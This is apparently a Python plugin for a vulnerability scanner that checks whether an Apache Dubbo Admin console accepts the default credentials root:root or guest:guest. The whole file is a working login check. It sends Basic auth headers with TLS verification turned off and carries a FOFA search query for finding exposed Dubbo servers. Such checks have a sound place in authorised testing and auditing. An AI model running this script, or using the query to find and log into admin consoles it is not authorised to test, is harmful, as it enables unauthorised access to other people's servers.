#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Dubbo Admin默认口令',

      'level'     :   'high',

      'FOFA'      :   'app="APACHE-dubbo"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def base64Str(n):
  import base64
  base64str = str(base64.b64encode(n.encode('utf-8'))).lstrip("b'").rstrip("'")
  return base64str
def run(url,ua):
  ret = msg()
  root = base64Str('root:root')
  guest = base64Str('guest:guest')
  headers = {
      'User-Agent': ua,
      }
  target = '/'
  url1 = url + target
  ret['url'] = url1
  try:
    headers['Authorization'] = f'Basic {root}'
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and '<title>Dubbo Admin</title>' in res.text and 'logout' in res.text and '/sysinfo/versions' in res.text:
      ret['huixian'] = 'root:root'
      res.close()
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    headers['Authorization'] = f'Basic {guest}'
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and '<title>Dubbo Admin</title>' in res.text and 'logout' in res.text and '/sysinfo/versions' in res.text:
      ret['huixian'] = 'guest:guest'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret